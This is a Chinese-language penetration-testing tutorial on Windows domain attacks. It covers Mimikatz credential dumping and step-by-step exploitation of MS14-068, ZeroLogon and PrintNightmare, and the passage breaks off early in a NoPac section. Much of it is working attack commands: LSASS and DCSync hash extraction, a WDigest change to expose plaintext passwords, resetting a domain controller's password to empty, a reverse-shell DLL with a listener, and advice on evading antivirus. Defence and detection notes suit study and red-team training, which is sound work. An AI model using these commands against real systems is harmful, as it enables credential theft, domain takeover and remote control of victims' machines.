<h1 id="六-内网渗透之mimikatz专题简介"><a href="#六-内网渗透之mimikatz专题简介" class="headerlink" title="六.内网渗透之mimikatz专题简介"></a>六.内网渗透之mimikatz专题简介</h1><p>Mimikatz 是红队渗透测试中不可或缺的工具，由法国安全研究员 Benjamin Delpy 开发，主要用于从 Windows 系统中提取敏感凭据（如明文密码、哈希值、Kerberos 票据等），并支持多种高级攻击手法。以下是其核心功能、使用场景及防御措施的全面解析：</p>
<hr>
<h2 id="1-核心功能与模块"><a href="#1-核心功能与模块" class="headerlink" title="1. 核心功能与模块"></a><strong>1. 核心功能与模块</strong></h2><h3 id="1-核心能力"><a href="#1-核心能力" class="headerlink" title="(1) 核心能力"></a><strong>(1) 核心能力</strong></h3><ul>
<li><strong>凭据提取</strong>：通过读取 LSASS 进程内存，获取明文密码、NTLM 哈希、Kerberos 票据等。</li>
<li><strong>令牌操作</strong>：模拟高权限令牌（如 <code>SYSTEM</code> 或域管理员），实现权限提升。</li>
<li><strong>横向移动</strong>：支持传递哈希（Pass-the-Hash）、票据传递（Pass-the-Ticket）等攻击。</li>
<li><strong>日志清除</strong>：清除系统安全日志，隐藏攻击痕迹。</li>
</ul>
<h3 id="2-关键模块"><a href="#2-关键模块" class="headerlink" title="(2) 关键模块"></a><strong>(2) 关键模块</strong></h3><ul>
<li><strong>sekurlsa</strong>：提取内存中的登录凭据（<code>sekurlsa::logonpasswords</code>）。</li>
<li><strong>kerberos</strong>：管理 Kerberos 票据（如黄金票据、白银票据注入）。</li>
<li><strong>lsadump</strong>：操作 LSA 数据库（<code>lsadump::dcsync</code> 导出域用户哈希）。</li>
<li><strong>privilege</strong>：提权操作（<code>privilege::debug</code> 启用调试权限）。</li>
<li><strong>token</strong>：令牌窃取与模拟（<code>token::elevate</code> 获取 <code>SYSTEM</code> 权限）。</li>
</ul>
<hr>
<h2 id="2-典型使用场景"><a href="#2-典型使用场景" class="headerlink" title="2. 典型使用场景"></a><strong>2. 典型使用场景</strong></h2><h3 id="1-内网渗透"><a href="#1-内网渗透" class="headerlink" title="(1) 内网渗透"></a><strong>(1) 内网渗透</strong></h3><ul>
<li><strong>密码提取</strong>：在已控制的主机上运行 <code>sekurlsa::logonpasswords</code>，获取当前登录用户的明文密码或哈希。</li>
<li><strong>横向移动</strong>：使用 <code>sekurlsa::pth</code> 传递哈希登录其他主机，或通过 <code>kerberos::golden</code> 生成黄金票据访问域资源。</li>
<li><strong>权限维持</strong>：通过 <code>lsadump::dcsync</code> 导出域控哈希，或注入持久化后门。</li>
</ul>
<h3 id="2-Windows-高版本适配"><a href="#2-Windows-高版本适配" class="headerlink" title="(2) Windows 高版本适配"></a><strong>(2) Windows 高版本适配</strong></h3><ul>
<li><strong>绕过 Credential Guard</strong>：在 Windows 10&#x2F;Server 2016+ 中，默认禁用明文密码缓存，需修改注册表启用 WDigest：<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="number">1</span> /f</span><br></pre></td></tr></table></figure></li>
<li><strong>配合工具提取</strong>：使用 <code>procdump</code> 导出 LSASS 内存文件（<code>.dmp</code>），再通过 <code>sekurlsa::minidump</code> 离线分析。</li>
</ul>
<hr>
<h2 id="3-常见攻击手法示例"><a href="#3-常见攻击手法示例" class="headerlink" title="3. 常见攻击手法示例"></a><strong>3. 常见攻击手法示例</strong></h2><h3 id="1-提取本地用户凭据"><a href="#1-提取本地用户凭据" class="headerlink" title="(1) 提取本地用户凭据"></a><strong>(1) 提取本地用户凭据</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug        <span class="comment"># 提权至调试权限</span></span><br><span class="line">token::elevate          <span class="comment"># 模拟 SYSTEM 令牌</span></span><br><span class="line">sekurlsa::logonpasswords  <span class="comment"># 提取内存中的明文密码</span></span><br></pre></td></tr></table></figure>

<h3 id="2-Kerberoasting-攻击"><a href="#2-Kerberoasting-攻击" class="headerlink" title="(2) Kerberoasting 攻击"></a><strong>(2) Kerberoasting 攻击</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export   <span class="comment"># 导出服务票据（TGS）</span></span><br><span class="line"><span class="comment"># 使用 Hashcat 离线破解服务账号哈希</span></span><br></pre></td></tr></table></figure>

<h3 id="3-DCSync-攻击（域控权限）"><a href="#3-DCSync-攻击（域控权限）" class="headerlink" title="(3) DCSync 攻击（域控权限）"></a><strong>(3) DCSync 攻击（域控权限）</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:example.com /user:krbtgt  <span class="comment"># 导出 krbtgt 账户哈希</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="4-防御与检测"><a href="#4-防御与检测" class="headerlink" title="4. 防御与检测"></a><strong>4. 防御与检测</strong></h2><h3 id="1-防护措施"><a href="#1-防护措施" class="headerlink" title="(1) 防护措施"></a><strong>(1) 防护措施</strong></h3><ul>
<li><strong>启用 Credential Guard</strong>：防止 LSASS 内存被读取。</li>
<li><strong>限制特权账户</strong>：服务账户避免使用高权限，禁用 <code>SeDebugPrivilege</code>。</li>
<li><strong>日志监控</strong>：关注事件 ID 4688（新进程）、4624（登录事件）、4662（DCSync 操作）。</li>
<li><strong>应用白名单</strong>：限制未签名程序执行（如 AppLocker）。</li>
</ul>
<h3 id="2-检测建议"><a href="#2-检测建议" class="headerlink" title="(2) 检测建议"></a><strong>(2) 检测建议</strong></h3><ul>
<li><strong>LSASS 保护</strong>：启用受控文件夹访问（Controlled Folder Access）阻止未授权进程访问 LSASS。</li>
<li><strong>异常行为分析</strong>：监控 <code>mimikatz.exe</code> 或 <code>Invoke-Mimikatz.ps1</code> 的执行痕迹。</li>
<li><strong>网络流量审计</strong>：识别 Kerberos 票据请求异常或哈希传递行为。</li>
</ul>
<hr>
<h2 id="5-工具联动与扩展"><a href="#5-工具联动与扩展" class="headerlink" title="5. 工具联动与扩展"></a><strong>5. 工具联动与扩展</strong></h2><ul>
<li><strong>Cobalt Strike 集成</strong>：通过 <code>mimikatz</code> 插件直接调用功能（如 <code>logonpasswords</code>）。</li>
<li><strong>Metasploit 框架</strong>：使用 <code>load kiwi</code> 模块加载 Mimikatz 功能。</li>
<li><strong>自动化攻击链</strong>：结合 BloodHound 分析攻击路径，利用 Mimikatz 快速提权。</li>
</ul>
<hr>
<h2 id="6-注意事项"><a href="#6-注意事项" class="headerlink" title="6. 注意事项"></a><strong>6. 注意事项</strong></h2><ul>
<li><strong>绕过杀软</strong>：通过源码修改（如混淆字符串）、内存加载（无文件执行）或使用 VMProtect 加壳实现免杀。</li>
<li><strong>系统兼容性</strong>：部分功能在 Windows 高版本受限，需结合其他工具（如 Rubeus、SharpKatz）。</li>
</ul>
<hr>
<p>Mimikatz 的威力在于其对 Windows 安全机制的深度利用，但同时也暴露了系统在凭据管理上的脆弱性。红队需灵活掌握其功能，而蓝队应通过加固配置与实时监控降低风险。</p>
<h1 id="七-域权限提升漏洞篇"><a href="#七-域权限提升漏洞篇" class="headerlink" title="七.域权限提升漏洞篇"></a>七.域权限提升漏洞篇</h1><p>​	Kerberos身份认证流程。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250423204511631.png?x-oss-process=style/img-to-webp" alt="image-20250423204511631"></p>
<h2 id="1-MS14-068"><a href="#1-MS14-068" class="headerlink" title="1.MS14-068"></a>1.MS14-068</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>MS14-068（CVE-2014-6324）是Kerberos协议中的权限提升漏洞，允许普通域用户伪造特权票据（TGT），获取域管理员权限。其核心问题在于<strong>KDC（密钥分发中心）对PAC（特权属性证书）签名的验证缺陷</strong>：</p>
<ol>
<li><strong>PAC验证绕过</strong>：攻击者可构造包含伪造高权限组（如域管理员组SID）的PAC，利用KDC对校验算法（如MD5）的支持缺陷，绕过密钥验证。</li>
<li><strong>签名伪造</strong>：正常PAC需使用服务账号和krbtgt的哈希签名，但漏洞允许使用无密钥依赖的MD5算法生成签名，使伪造的PAC通过验证。</li>
<li><strong>票据注入</strong>：伪造的TGT被KDC接受后，攻击者可生成任意服务的访问票据（如CIFS），从而获得域控权限。</li>
</ol>
<hr>
<h3 id="漏洞复现流程"><a href="#漏洞复现流程" class="headerlink" title="漏洞复现流程"></a><strong>漏洞复现流程</strong></h3><p><strong>前提条件</strong> ：</p>
<ul>
<li>域控未安装补丁KB3011780。</li>
<li>获取普通域用户的账号密码（或Hash）及其SID。</li>
<li>域内存在至少一台未加固的主机。</li>
</ul>
<p><strong>复现步骤</strong>：</p>
<ol>
<li><p><strong>环境检测</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | find <span class="string">&quot;3011780&quot;</span>  <span class="comment"># 确认域控未安装补丁</span></span><br><span class="line"><span class="built_in">whoami</span> /all                  <span class="comment"># 获取当前用户SID（如S-1-5-21-xxx）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>生成伪造票据</strong><br>使用工具（如<code>ms14-068.exe</code>或<code>Pykek</code>）生成TGT：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u user@domain.com -p password -s &lt;SID&gt; -d &lt;域控IP&gt;</span><br><span class="line"><span class="comment"># 示例：生成TGT_user@domain.com.ccache</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>票据注入</strong><br>通过Mimikatz或Kekeo注入内存：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge      <span class="comment"># 清除现有票据</span></span><br><span class="line">kerberos::ptc TGT_user@domain.com.ccache  <span class="comment"># 注入伪造票据</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>权限验证与利用</strong>  </p>
<ul>
<li>访问域控共享目录：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\DC\C$        <span class="comment"># 成功访问说明提权成功</span></span><br></pre></td></tr></table></figure></li>
<li>使用PsExec获取域控Shell：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\DC cmd.exe  <span class="comment"># 以管理员身份执行命令</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a><strong>适用范围</strong></h3><ol>
<li><strong>受影响系统</strong> ：<ul>
<li>Windows Server 2003&#x2F;2008&#x2F;2012（未安装KB3011780）。</li>
<li>桌面系统：Windows Vista&#x2F;7&#x2F;8&#x2F;8.1。</li>
</ul>
</li>
<li><strong>利用场景</strong>：<ul>
<li>攻击者已控制域内一台普通主机，并获取低权限域用户凭据。</li>
<li>域控未启用SID过滤或PAC强验证机制。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="PAC扩展知识补充"><a href="#PAC扩展知识补充" class="headerlink" title="PAC扩展知识补充"></a>PAC扩展知识补充</h3><ul>
<li><strong>PAC核心作用：权限声明</strong>：<br>PAC是微软对Kerberos协议的扩展，由KDC生成并嵌入到TGT中，用于声明用户的<strong>组成员身份</strong>（如域管理员组）、<strong>权限列表</strong>（如SeEnableDelegationPrivilege）等。<ul>
<li><strong>关键字段</strong>：用户SID、所属组SID列表、用户权限、PAC签名等。</li>
<li><strong>验证机制</strong>：PAC需由KDC使用<strong>krbtgt账号的密钥</strong>签名，确保其合法性。</li>
</ul>
</li>
</ul>
<h3 id="防御与缓解措施"><a href="#防御与缓解措施" class="headerlink" title="防御与缓解措施"></a><strong>防御与缓解措施</strong></h3><ol>
<li><strong>补丁修复</strong>：<br>域控安装补丁KB3011780，并确保所有主机更新至最新版本。</li>
<li><strong>权限控制</strong>：<br>限制普通用户权限，避免其获取本地管理员权限。</li>
<li><strong>流量监控</strong>：<br>监控Kerberos请求中的异常行为（如大量TGT请求或异常PAC内容）。</li>
<li><strong>加固Kerberos</strong>：<br>启用PAC签名强校验（如仅允许AES&#x2F;HMAC算法）。</li>
</ol>
<hr>
<h3 id="工具与扩展"><a href="#工具与扩展" class="headerlink" title="工具与扩展"></a><strong>工具与扩展</strong></h3><ul>
<li><strong>利用工具</strong>：<code>ms14-068.exe</code>、<code>Pykek</code>、<code>Mimikatz</code>、<code>goldenPac</code>（自动化攻击）。</li>
<li><strong>检测脚本</strong>：通过Wireshark分析Kerberos流量，识别伪造PAC的MD5签名特征。</li>
</ul>
<h2 id="2-CVE-2020-1472（ZeroLogon）"><a href="#2-CVE-2020-1472（ZeroLogon）" class="headerlink" title="2.CVE-2020-1472（ZeroLogon）"></a>2.CVE-2020-1472（ZeroLogon）</h2><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a><strong>漏洞利用条件</strong></h3><ol>
<li><p><strong>目标环境要求</strong>：</p>
<ul>
<li><strong>受影响系统</strong>：Windows Server 2008 R2至2019版本（包括Server Core安装模式）的域控制器（DC）。</li>
<li><strong>补丁状态</strong>：目标域控未安装微软2020年8月发布的补丁（KB4571729）或未启用“强制模式”（2021年2月前未强制修复）。</li>
<li><strong>网络访问</strong>：攻击者需能通过TCP访问域控的445端口（Netlogon协议默认端口）。</li>
</ul>
</li>
<li><p><strong>攻击前提</strong>：</p>
<ul>
<li><strong>域控信息</strong>：已知域控的计算机名（NetBIOS名称）和IP地址。</li>
<li><strong>权限要求</strong>：无需任何域内用户凭证，攻击者可处于域外环境发起攻击。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="漏洞利用流程"><a href="#漏洞利用流程" class="headerlink" title="漏洞利用流程"></a><strong>漏洞利用流程</strong></h3><p><strong>1. 漏洞检测</strong><br>使用工具（如Secura提供的<code>zerologon_tester.py</code>）验证目标域控是否存在漏洞：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 zerologon_tester.py &lt;域控计算机名&gt; &lt;域控IP&gt;</span><br><span class="line"><span class="comment"># 示例：python3 zerologon_tester.py DC01 192.168.1.100</span></span><br></pre></td></tr></table></figure>
<p>若返回“Success!”，则漏洞存在。</p>
<p><strong>2. 重置域控机器账户密码</strong><br>利用工具（如<code>set_empty_pw.py</code>）将域控机器账户的密码置空：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 set_empty_pw.py &lt;域控计算机名&gt; &lt;域控IP&gt;</span><br><span class="line"><span class="comment"># 示例：python3 set_empty_pw.py DC01 192.168.1.100</span></span><br></pre></td></tr></table></figure>
<p>此操作会通过调用<code>NetrServerPasswordSet2</code>函数将域控的机器用户密码重置为空，导致域控与域数据库的凭证不一致（可能引发脱域风险）。</p>
<p><strong>3. 导出域内哈希</strong><br>使用Impacket的<code>secretsdump.py</code>工具，利用空密码导出域控的哈希（包括域管账户）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -no-pass &lt;域名&gt;/&lt;域控计算机名&gt;<span class="variable">$@</span>&lt;域控IP&gt;</span><br><span class="line"><span class="comment"># 示例：python3 secretsdump.py -no-pass example.com/DC01\$@192.168.1.100</span></span><br></pre></td></tr></table></figure>
<p>获取的NTLM哈希可用于后续横向移动或生成黄金票据。</p>
<p><strong>4. 获取域控权限</strong><br>通过哈希传递（Pass-the-Hash）工具（如<code>wmiexec.py</code>）获取交互式Shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes &lt;LM哈希&gt;:&lt;NTLM哈希&gt; &lt;域名&gt;/administrator@&lt;域控IP&gt;</span><br><span class="line"><span class="comment"># 示例：python3 wmiexec.py -hashes aad3b435...:570a9a65... example.com/administrator@192.168.1.100</span></span><br></pre></td></tr></table></figure>

<p><strong>5. 恢复域控原始密码</strong><br>为防止域控脱域，需从注册表导出原始哈希并还原：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导出注册表文件</span></span><br><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用secretsdump解析哈希</span></span><br><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还原密码</span></span><br><span class="line">python3 reinstall_original_pw.py &lt;域控计算机名&gt; &lt;域控IP&gt; &lt;原始哈希HEX值&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="关键技术与原理"><a href="#关键技术与原理" class="headerlink" title="关键技术与原理"></a><strong>关键技术与原理</strong></h3><ol>
<li><p><strong>加密缺陷</strong>：</p>
<ul>
<li><strong>AES-CFB8模式</strong>：Netlogon协议使用AES-CFB8加密时，初始化向量（IV）被错误设置为全零，攻击者通过多次碰撞（平均256次）生成全零的客户端凭证（Client Credential），绕过认证。</li>
<li><strong>挑战-响应机制</strong>：攻击者可控的Client Challenge设置为全零，结合固定IV，导致密文碰撞概率大幅提升（从1&#x2F;2^64降至1&#x2F;256）。</li>
</ul>
</li>
<li><p><strong>权限提升路径</strong>：</p>
<ul>
<li><strong>密码重置</strong>：通过<code>NetrServerPasswordSet2</code>调用将域控机器账户密码置空，利用其DCSync特权导出域管哈希。</li>
<li><strong>横向扩展</strong>：获取域管权限后可进一步控制整个域环境。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="防御与缓解措施-1"><a href="#防御与缓解措施-1" class="headerlink" title="防御与缓解措施"></a><strong>防御与缓解措施</strong></h3><ol>
<li><strong>补丁修复</strong>：安装微软官方补丁并启用“强制模式”，确保所有域控和客户端使用安全的Netlogon协议。</li>
<li><strong>网络隔离</strong>：限制对域控445端口的非必要访问，启用SMB签名和加密。</li>
<li><strong>监控与检测</strong>：监控异常Netlogon请求（如大量全零参数的认证尝试）。</li>
</ol>
<hr>
<h3 id="工具与资源"><a href="#工具与资源" class="headerlink" title="工具与资源"></a><strong>工具与资源</strong></h3><ul>
<li><strong>检测工具</strong>：<a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">SecuraBV&#x2F;CVE-2020-1472</a></li>
<li><strong>利用脚本</strong>：<a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">risksense&#x2F;zerologon</a></li>
<li><strong>协议库</strong>：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">Impacket</a>（需v0.9.22+）</li>
</ul>
<h2 id="3-CVE-2021-1675-PrintNightmare"><a href="#3-CVE-2021-1675-PrintNightmare" class="headerlink" title="3.CVE-2021-1675 (PrintNightmare)"></a>3.CVE-2021-1675 (PrintNightmare)</h2><h3 id="漏洞利用条件-1"><a href="#漏洞利用条件-1" class="headerlink" title="漏洞利用条件"></a><strong>漏洞利用条件</strong></h3><ol>
<li><p><strong>目标环境要求</strong>  </p>
<ul>
<li><strong>受影响系统</strong>：Windows Server 2008 R2至2022版本、Windows 7至11的客户端系统，尤其是域控制器（DC）。</li>
<li><strong>补丁状态</strong>：未安装微软2021年6月及后续修复补丁（KB5005010等），或未启用“强制模式”的域控环境。</li>
<li><strong>服务状态</strong>：目标主机的Print Spooler服务（<code>spoolsv.exe</code>）需处于运行状态（默认开启）。</li>
</ul>
</li>
<li><p><strong>攻击前提</strong>  </p>
<ul>
<li><strong>权限要求</strong>：普通域用户账号或机器账号（如<code>iis$</code>）的凭据（密码或Hash）。</li>
<li><strong>网络访问</strong>：攻击者需能通过SMB协议访问目标主机的445端口，并拥有一个匿名共享目录用于存放恶意DLL文件。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="漏洞利用流程-1"><a href="#漏洞利用流程-1" class="headerlink" title="漏洞利用流程"></a><strong>漏洞利用流程</strong></h3><p><strong>1. 环境检测</strong>  </p>
<ul>
<li><strong>确认Print Spooler服务状态</strong>：<br>使用<code>rpcdump.py</code>扫描目标主机的Print Spooler服务是否开放：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcdump.py @目标IP | grep -i <span class="string">&#x27;MS-RPRN&#x27;</span>  <span class="comment"># 存在输出则服务可用。</span></span><br></pre></td></tr></table></figure></li>
<li><strong>验证补丁状态</strong>：<br>检查目标系统是否已安装补丁，例如通过<code>systeminfo</code>命令或网络工具间接判断。</li>
</ul>
<p><strong>2. 生成恶意DLL</strong><br>使用<code>msfvenom</code>生成反向Shell的DLL（需与目标架构匹配）：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP LPORT=监听端口 -f dll -o exploit.dll。</span><br></pre></td></tr></table></figure>

<p><strong>3. 配置匿名SMB共享</strong>  </p>
<ul>
<li>在攻击机（如Kali）或域内主机上设置匿名共享目录，存放恶意DLL（需确保共享路径可被目标访问）：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver share 共享目录路径 -smb2support。</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>4. 执行漏洞利用</strong><br>使用<code>CVE-2021-1675.py</code>脚本发起攻击（需安装修改版Impacket库）：  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021-1675.py 域名/用户名:密码@目标IP <span class="string">&#x27;\\攻击者IP\共享目录\exploit.dll&#x27;</span>。</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>参数说明</strong>：  <ul>
<li>用户名&#x2F;密码：普通域用户或机器账号凭据。  </li>
<li>DLL路径：指向SMB共享中的恶意DLL。</li>
</ul>
</li>
</ul>
<p><strong>5. 获取权限</strong>  </p>
<ul>
<li>启动监听器（如Netcat或Metasploit）捕获反向Shell：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 监听端口  <span class="comment"># Shell以SYSTEM权限返回。</span></span><br></pre></td></tr></table></figure></li>
<li><strong>扩展利用</strong>：通过获取的权限执行横向移动、提取域哈希（如<code>secretsdump.py</code>）或植入持久化后门。</li>
</ul>
<hr>
<h3 id="技术原理与漏洞本质"><a href="#技术原理与漏洞本质" class="headerlink" title="技术原理与漏洞本质"></a><strong>技术原理与漏洞本质</strong></h3><ul>
<li><strong>核心缺陷</strong>：Print Spooler服务以<code>SYSTEM</code>权限运行，且未对<code>YAddPrinterDriverEx</code>函数的参数<code>dwFileCopyFlags</code>进行严格校验。通过设置<code>APD_INSTALL_WARNED_DRIVER</code>标志（0x8000），可绕过驱动签名校验，强制加载任意DLL。</li>
<li><strong>攻击链</strong>：  <ol>
<li><strong>权限绕过</strong>：利用RPC调用（如<code>RpcAddPrinterDriverEx</code>）绕过<code>ValidateObjectAccess</code>检查，允许低权限用户安装驱动。  </li>
<li><strong>DLL注入</strong>：恶意DLL被复制至<code>C:\Windows\System32\spool\drivers\x64\3\</code>目录并加载，触发代码执行。</li>
</ol>
</li>
</ul>
<hr>
<h3 id="防御与缓解措施-2"><a href="#防御与缓解措施-2" class="headerlink" title="防御与缓解措施"></a><strong>防御与缓解措施</strong></h3><ol>
<li><strong>补丁修复</strong>：安装微软官方补丁（KB5005010等），并重启系统生效。  </li>
<li><strong>服务禁用</strong>：非必要环境下禁用Print Spooler服务：  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Stop-Service</span> <span class="literal">-Name</span> Spooler <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Set-Service</span> <span class="literal">-Name</span> Spooler <span class="literal">-StartupType</span> Disabled。</span><br></pre></td></tr></table></figure></li>
<li><strong>权限控制</strong>：限制普通用户安装打印机驱动的权限，启用SMB签名及加密。  </li>
<li><strong>监控与检测</strong>：  <ul>
<li>监控<code>spoolsv.exe</code>加载异常DLL的行为（如非系统路径的模块）。  </li>
<li>检测<code>C:\Windows\System32\spool\drivers\x64\</code>目录下的新增文件（如<code>.dll</code>）。  </li>
<li>分析事件日志（如Event ID 808、5145）中的异常打印服务操作。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="复现失败常见原因"><a href="#复现失败常见原因" class="headerlink" title="复现失败常见原因"></a><strong>复现失败常见原因</strong></h3><ul>
<li><strong>补丁未完全生效</strong>：部分系统需多次安装补丁或手动启用“强制模式”。  </li>
<li><strong>共享路径配置错误</strong>：匿名SMB共享权限不足或路径不可达（需确保<code>guest</code>访问权限）。  </li>
<li><strong>DLL架构不匹配</strong>：目标系统为64位时需生成64位DLL，否则加载失败。</li>
</ul>
<p><strong>参考工具</strong>：  </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/cube0x0/CVE-2021-1675">cube0x0&#x2F;CVE-2021-1675</a>（漏洞利用脚本）  </li>
<li><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">Impacket</a>（网络协议库）  </li>
<li><a target="_blank" rel="noopener" href="https://github.com/cube0x0/SharpPrintNightmare">SharpPrintNightmare</a>（本地提权工具）。</li>
</ul>
<h2 id="4-CVE-2021-42278-CVE-2021-42287（NoPac）"><a href="#4-CVE-2021-42278-CVE-2021-42287（NoPac）" class="headerlink" title="4.CVE-2021-42278 + CVE-2021-42287（NoPac）"></a>4.CVE-2021-42278 + CVE-2021-42287（NoPac）</h2><h3 id="漏洞原理概述"><a href="#漏洞原理概述" class="headerlink" title="漏洞原理概述"></a><strong>漏洞原理概述</strong></h3><p>NoPac漏洞是CVE-2021-42278和CVE-2021-42287的组合利用，允许攻击者通过伪造域控机器账户（DC）的sAMAccountName属性，结合Kerberos协议的缺陷，将普通域用户权限提升至域管理员权限。其核心原理如下：</p>
<ol>
<li><strong>CVE-2021-42278（sAMAccountName伪造）</strong><br>Active Directory未对机器账户的sAMAccountName属性进行严格校验，允许攻击者创建与域控机器账户同名但**不带$**的账户（如将机器账户名从<code>DC</code>改为<code>DC$</code>的原始名称<code>DC</code>），从而绕过命名规则限制。</li>
<li><strong>CVE-2021-42287（Kerberos逻辑缺陷）</strong><br>当KDC（密钥分发中心）未找到TGT对应的账户时，会自动尝试在账户名后添加<code>$</code>重新搜索（如从<code>DC</code>变为<code>DC$</code>），并使用域控密钥加密服务票据（ST），从而授予攻击者域控权限。</li>
</ol>
<hr>
<h3 id="漏洞利用条件-2"><a href="#漏洞利用条件-2" class="headerlink" title="漏洞利用条件"></a><strong>漏洞利用条件</strong></h3><ol>
<li><p><strong>目标环境要求</strong>：</p>
<ul>
<li>域控未安装补丁<strong>KB5008602</strong>或<strong>KB5008380</strong>。</li>
<li>域内普通用户账户的凭据（密码或Hash），且该用户具有<strong>创建机器账户的权限</strong>（默认<code>MachineAccountQuota=10</code>）。</li>
<li>攻击者需能访问域控的<strong>445端口（SMB）</strong>和<strong>88端口（Kerberos）</strong>。</li>
</ul>
</li>
<li><p><strong>特殊场景</strong>：</p>
<ul>
<li>若<code>MachineAccountQuota=0</code>（即禁止创建机器账户），攻击者需利用已有用户账户的<strong>sAMAccountName修改权限</strong>（如具有<code>WriteProperty</code>权限）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="漏洞利用流程-2"><a href="#漏洞利用流程-2" class="headerlink" title="漏洞利用流程"></a><strong>漏洞利用流程</strong></h3><h4 id="手动利用步骤"><a href="#手动利用步骤" class="headerlink" title="手动利用步骤"></a><strong>手动利用步骤</strong></h4><ol>
<li><p><strong>创建并配置伪造的机器账户</strong>  </p>
<ul>
<li>使用PowerShell模块（如<code>Powermad.ps1</code>）创建机器账户：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> AttackerMachine <span class="literal">-Password</span> <span class="string">&#x27;P@ssw0rd!&#x27;</span></span><br></pre></td></tr></table></figure></li>
